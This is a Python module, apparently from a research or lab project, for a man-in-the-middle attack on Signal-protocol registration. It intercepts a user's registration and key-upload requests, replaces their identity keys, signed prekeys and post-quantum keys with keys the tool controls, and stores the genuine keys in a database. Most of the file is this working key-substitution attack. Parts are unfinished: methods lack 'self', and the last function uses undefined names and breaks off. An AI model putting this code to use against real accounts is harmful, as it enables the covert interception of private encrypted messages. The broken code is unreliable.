from src.mitm_interface import MitmUser, MitmVisitenKarte, VisitenKarteType
from signal_protocol.address import ProtocolAddress
from signal_protocol.state import PreKeyBundle
import base64
from typing import Optional
from db.database import LegitKeyRecord, User, Device, VisitenKarte, ConversationSession
from db.session import DatabaseSessionManager
from dataclasses import dataclass

@dataclass
class KeyData:
    IdenKey: Optional[str] = None
    SignedPreKey: Optional[dict] = None
    pq_lastResortKey: Optional[dict] = None
    PreKeys: Optional[list[dict]] = None
    pq_PreKeys: Optional[list[dict]] = None

@dataclass
class RegistrationInfo:
    aci: Optional[str] = None
    pni: Optional[str] = None
    unidentifiedAccessKey: Optional[str] = None
    registrationId: Optional[int] = None
    pniRegistrationId: Optional[int] = None

    aciData: KeyData = None
    pniData: KeyData = None

    victim: MitmUser = None

class MitmUserOrchestrator:
    """
    Orchestrates the management of MitmUser instances.
    """

    def __init__(self):
        self.users = {}

    # def get_or_create_user(self, protocol_address: ProtocolAddress, aci_uuid: str, pni_uuid: str) -> MitmUser:
    #     """
    #     Retrieve or create a MitmUser based on its protocol address and UUIDs.
    #     """
    #     key = (protocol_address.name(), protocol_address.device_id())
    #     if key not in self.users:
    #         user = MitmUser(protocol_address, aci_uuid, pni_uuid)
    #         self.users[key] = user
    #     return self.users[key]

    # def update_user(self, protocol_address: ProtocolAddress, update_data):
    #     """
    #     Update user data (e.g., phone number or keys).
    #     """
    #     key = (protocol_address.name(), protocol_address.device_id())
    #     if key in self.users:
    #         user = self.users[key]
    #         if 'phone_number' in update_data:
    #             user._phone_number = update_data['phone_number']
    #         if 'unidentified_access_key' in update_data:
    #             user._unidentified_access_key = update_data['unidentified_access_key']
    #         # Add other update logic as needed.

    # def list_users(self):
    #     """
    #     Return a list of all managed users.
    #     """
    #     return list(self.users.values())

    # def __repr__(self):
    #     return f"MitmUserOrchestrator(users={len(self.users)})"


    def registration_req( req, user_registration_info: RegistrationInfo):
        
        user_registration_info.victim = MitmUser(
            protocol_address=ProtocolAddress(
                name=req["sessionId"],
                device_id=1,
            ),
            aci_uuid="",
            pni_uuid="",
        )

        user_registration_info.victim.get_aci_visitenkarte()._registration_id = req["accountAttributes"]["registrationId"]
        user_registration_info.victim.get_pni_visitenkarte()._registration_id = req["accountAttributes"][
            "pniRegistrationId"
        ]

        # Save all the legit data for later use
        #user_registration_info.serialized_registration_req = flow.request.content
        user_registration_info.registrationId = req["accountAttributes"]["registrationId"]
        user_registration_info.pniRegistrationId = req["accountAttributes"]["pniRegistrationId"]
        user_registration_info.unidentifiedAccessKey = req["accountAttributes"]["unidentifiedAccessKey"]

        user_registration_info.victim._unidentified_access_key = req["accountAttributes"]["unidentifiedAccessKey"]

        #print("Unidentified Access Key: ", user_registration_info.unidentifiedAccessKey)

        user_registration_info.aciData = KeyData(
            IdenKey=req["aciIdentityKey"],
            SignedPreKey=req["aciSignedPreKey"],
            pq_lastResortKey=req["aciPqLastResortPreKey"],
        )
        user_registration_info.pniData = KeyData(
            IdenKey=req["pniIdentityKey"],
            SignedPreKey=req["pniSignedPreKey"],
            pq_lastResortKey=req["pniPqLastResortPreKey"],
        )

        # reg_info[ip_address] = user_registration_info
        # api.local_registrations = reg_info

        # Swap fake keys

        req["aciIdentityKey"] = (
            user_registration_info.victim.get_identity_key(VisitenKarteType.ACI).public_key().to_base64()
        )
        req["pniIdentityKey"] = (
            user_registration_info.victim.get_identity_key(VisitenKarteType.PNI).public_key().to_base64()
        )

        req["aciSignedPreKey"]["publicKey"] = (
            user_registration_info.victim.get_aci_visitenkarte().get_signed_pre_key_record().public_key().to_base64()
        )
        req["aciSignedPreKey"]["signature"] = base64.b64encode(
            user_registration_info.victim.get_aci_visitenkarte().get_signed_pre_key_record().signature()
        ).decode()

        req["pniSignedPreKey"]["publicKey"] = (
            user_registration_info.victim.get_pni_visitenkarte().get_signed_pre_key_record().public_key().to_base64()
        )
        req["pniSignedPreKey"]["signature"] = base64.b64encode(
            user_registration_info.victim.get_pni_visitenkarte().get_signed_pre_key_record().signature()
        ).decode()

        req["aciPqLastResortPreKey"]["publicKey"] = (
            user_registration_info.victim.get_aci_visitenkarte().get_last_resort_kyber_pre_key().public_key().to_base64()
        )
        req["aciPqLastResortPreKey"]["signature"] = base64.b64encode(
            user_registration_info.victim.get_aci_visitenkarte().get_last_resort_kyber_pre_key().signature()
        ).decode()

        req["pniPqLastResortPreKey"]["publicKey"] = (
            user_registration_info.victim.get_pni_visitenkarte().get_last_resort_kyber_pre_key().public_key().to_base64()
        )
        req["pniPqLastResortPreKey"]["signature"] = base64.b64encode(
            user_registration_info.victim.get_pni_visitenkarte().get_last_resort_kyber_pre_key().signature()
        ).decode()

        return req,user_registration_info

        # flow.request.content = json.dumps(req).encode()

    def registration_resp(resp, user_registration_info: RegistrationInfo):
        user_registration_info.victim.get_aci_visitenkarte()._uuid = resp["uuid"]
        user_registration_info.victim.get_pni_visitenkarte()._uuid = resp["pni"]
        user_registration_info.victim._phone_number = resp["number"]

        user_registration_info.aci = resp["uuid"]
        user_registration_info.pni = resp["pni"]

        user_registration_info.victim._protocol_address = ProtocolAddress(name=resp["uuid"], device_id=1)

        # api.local_registrations[ip_address] = user_registration_info

        return resp, user_registration_info
    
    def keys_upload_req(req, identity, user_registration_info: RegistrationInfo):
        identity_type = VisitenKarteType.ACI if identity == "aci" else VisitenKarteType.PNI

        key_data = user_registration_info.aciData if identity == "aci" else user_registration_info.pniData

        key_data.PreKeys = req["preKeys"]
        key_data.pq_PreKeys = req["pqPreKeys"]

        alice = user_registration_info.victim

        alice.get_visitenkarte(identity_type).update_kyber_pre_keys(key_data.pq_PreKeys[0]["keyId"])
        alice.get_visitenkarte(identity_type).update_pre_keys(key_data.PreKeys[0]["keyId"])

        req["preKeys"] = alice.get_visitenkarte(identity_type).serialize_pre_keys()
        req["pqPreKeys"] = alice.get_visitenkarte(identity_type).serialize_kyber_pre_keys()      

        return req, user_registration_info
    
    def keys_upload_resp(resp, identity, user_info:RegistrationInfo):

        identity_type = VisitenKarteType.ACI if identity == "aci" else VisitenKarteType.PNI
        other_identity_type = VisitenKarteType.PNI if identity_type == VisitenKarteType.ACI else VisitenKarteType.ACI

        key_data = user_info.aciData if identity_type == VisitenKarteType.ACI else user_info.pniData
        other_key_data = user_info.aciData if other_identity_type == VisitenKarteType.ACI else user_info.pniData

        if (other_key_data.PreKeys == None):
            return

        ## commit to DB
        ############## Legit Records ##############

        serialized_legit_record = {}
        serialized_legit_record["uuid"] = user_info.aci if identity_type == VisitenKarteType.ACI else user_info.pni
        serialized_legit_record["type"] = identity_type.value
        serialized_legit_record["signedPreKey"] = key_data.SignedPreKey
        serialized_legit_record["preKey"] = key_data.PreKeys
        serialized_legit_record["pqPreKey"] = key_data.pq_PreKeys
        serialized_legit_record["PqLastResortPreKey"] = key_data.pq_lastResortKey
        serialized_legit_record["deviceId"] = 1
        serialized_legit_record["registrationId"] = user_info.registrationId if identity_type == VisitenKarteType.ACI else user_info.pniRegistrationId
        serialized_legit_record["identityKey"] = key_data.IdenKey


        identity_legit_key_record = LegitKeyRecord.model_validate(serialized_legit_record)

        other_serialized_legit_record = {}
        other_serialized_legit_record["uuid"] = user_info.aci if other_identity_type == VisitenKarteType.ACI else user_info.pni
        other_serialized_legit_record["type"] = other_identity_type.value
        other_serialized_legit_record["signedPreKey"] = other_key_data.SignedPreKey
        other_serialized_legit_record["preKey"] = other_key_data.PreKeys
        other_serialized_legit_record["pqPreKey"] = other_key_data.pq_PreKeys
        other_serialized_legit_record["PqLastResortPreKey"] = other_key_data.pq_lastResortKey
        other_serialized_legit_record["deviceId"] = 1
        other_serialized_legit_record["registrationId"] = user_info.registrationId if other_identity_type == VisitenKarteType.ACI else user_info.pniRegistrationId
        other_serialized_legit_record["identityKey"] = other_key_data.IdenKey

        other_legit_key_record = LegitKeyRecord.model_validate(other_serialized_legit_record)

        ############## User ##############
        #print("User Info: ", user_info)
        #print("User Info Victim: ", user_info.victim._unidentified_access_key)
        user_info.victim.save_user()

        session_manager = DatabaseSessionManager()
        session = session_manager.get_session()

        with session as s:
            s.merge(identity_legit_key_record)
            s.merge(other_legit_key_record)

            s.commit()  

    def get_bundle_resp(resp, user_info):
        
        ## check if the keybundle is from already registered (legit or victim) user in the database
        bob_key_bundle = PreKeyBundle(
            registration_id= resp["devices"][0]["registrationId"],
            device_id= resp["devices"][0]["deviceId"],
            pre_key_public= (resp["devices"][0]["preKey"]["keyId"], resp["devices"][0]["preKey"]["publicKey"]),
            signed_pre_key_id= resp["devices"][0]["signedPreKey"]["keyId"],
            signed_pre_key_public= resp["devices"][0]["signedPreKey"]["publicKey"],
            signed_pre_key_signature= resp["devices"][0]["signedPreKey"]["signature"],
            identity_key= IdentityKey.from_base64(resp["identityKey"])
         )



        api.local_registrations[address] = user_info